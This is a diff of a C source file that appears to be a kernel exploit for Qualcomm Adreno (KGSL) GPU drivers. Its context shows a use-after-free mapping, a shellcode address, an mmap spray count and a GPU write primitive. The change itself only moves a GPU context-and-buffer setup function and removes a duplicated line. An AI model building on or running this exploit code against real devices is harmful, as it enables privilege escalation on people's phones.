@@ -90,50 +90,6 @@ uint64_t g_uaf_mmapsize = 0;
 void *g_uaf_mmap_ptr = NULL;
 uint64_t g_shellcode_va = 0;
 
-static unsigned g_persistent_ctx_id = 0;
-static unsigned g_persistent_ib_id = 0;
-static void *g_persistent_ib_vma = NULL;
-static uint64_t g_persistent_ib_gpu = 0;
-static unsigned g_persistent_dst_id = 0;
-static void *g_persistent_dst_vma = NULL;
-static uint64_t g_persistent_dst_gpu = 0;
-
-static int setup_gpu_persistent(int fd) {
-    if (fd < 0) return -1;
-    if (g_persistent_ctx_id != 0) return 0;
-    
-    struct kgsl_drawctxt_create ctx = {.flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
-    int retry = 30; // Больше попыток
-    while (retry--) {
-        if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) == 0) {
-            g_persistent_ctx_id = ctx.drawctxt_id;
-            break;
-        }
-        if (retry % 5 == 0) fprintf(stderr, "[GPU] Waiting for context slot... (%d left)\n", retry);
-        usleep(300000); // 300ms
-    }
-    if (g_persistent_ctx_id == 0) return -1;
-
-    struct kgsl_gpuobj_alloc ib_alloc = {.size = PAGE_SIZE * 8, .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
-    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0) return -1;
-    g_persistent_ib_id = ib_alloc.id;
-    g_persistent_ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ((off_t)g_persistent_ib_id) << 12);
-    
-    struct kgsl_gpuobj_info info = {.id = g_persistent_ib_id};
-    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
-    g_persistent_ib_gpu = info.gpuaddr;
-
-    struct kgsl_gpuobj_alloc dst_alloc = {.size = PAGE_SIZE * 2, .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
-    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0) return -1;
-    g_persistent_dst_id = dst_alloc.id;
-    g_persistent_dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ((off_t)g_persistent_dst_id) << 12);
-    info.id = g_persistent_dst_id;
-    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
-    g_persistent_dst_gpu = info.gpuaddr;
-
-    return 0;
-}
-
 static void flush_icache(void *addr, size_t len)
 {
     __builtin___clear_cache((char *)addr, (char *)addr + len);
@@ -493,6 +449,50 @@ static inline uint32_t pm4_calc_odd_parity_bit(uint32_t val)
     return (0x9669u >> (0xFu & (val ^ (val >> 4) ^ (val >> 8) ^ (val >> 12) ^
                                 (val >> 16) ^ (val >> 20) ^ (val >> 24) ^ (val >> 28)))) &
            1u;
+}
+
+static unsigned g_persistent_ctx_id = 0;
+static unsigned g_persistent_ib_id = 0;
+static void *g_persistent_ib_vma = NULL;
+static uint64_t g_persistent_ib_gpu = 0;
+static unsigned g_persistent_dst_id = 0;
+static void *g_persistent_dst_vma = NULL;
+static uint64_t g_persistent_dst_gpu = 0;
+
+static int setup_gpu_persistent(int fd) {
+    if (fd < 0) return -1;
+    if (g_persistent_ctx_id != 0) return 0;
+    
+    struct kgsl_drawctxt_create ctx = {.flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
+    int retry = 30;
+    while (retry--) {
+        if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) == 0) {
+            g_persistent_ctx_id = ctx.drawctxt_id;
+            break;
+        }
+        if (retry % 5 == 0) fprintf(stderr, "[GPU] Waiting for context slot... (%d left)\n", retry);
+        usleep(300000);
+    }
+    if (g_persistent_ctx_id == 0) return -1;
+
+    struct kgsl_gpuobj_alloc ib_alloc = {.size = PAGE_SIZE * 8, .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
+    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0) return -1;
+    g_persistent_ib_id = ib_alloc.id;
+    g_persistent_ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ((off_t)g_persistent_ib_id) << 12);
+    
+    struct kgsl_gpuobj_info info = {.id = g_persistent_ib_id};
+    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
+    g_persistent_ib_gpu = info.gpuaddr;
+
+    struct kgsl_gpuobj_alloc dst_alloc = {.size = PAGE_SIZE * 2, .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
+    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0) return -1;
+    g_persistent_dst_id = dst_alloc.id;
+    g_persistent_dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ((off_t)g_persistent_dst_id) << 12);
+    info.id = g_persistent_dst_id;
+    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
+    g_persistent_dst_gpu = info.gpuaddr;
+
+    return 0;
 }
 
 #define MMAP_SPRAY_COUNT 4000
@@ -931,8 +931,6 @@ static int gpu_write_task_u32(int fd, uint64_t dst_va, uint32_t value)
 {
     uint8_t buf[4];
     memcpy(buf, &value, 4);
-    return gpu_write_task_virt(fd, dst_va, buf, 4);
-}
     return gpu_write_task_virt(fd, dst_va, buf, 4);
 }
 
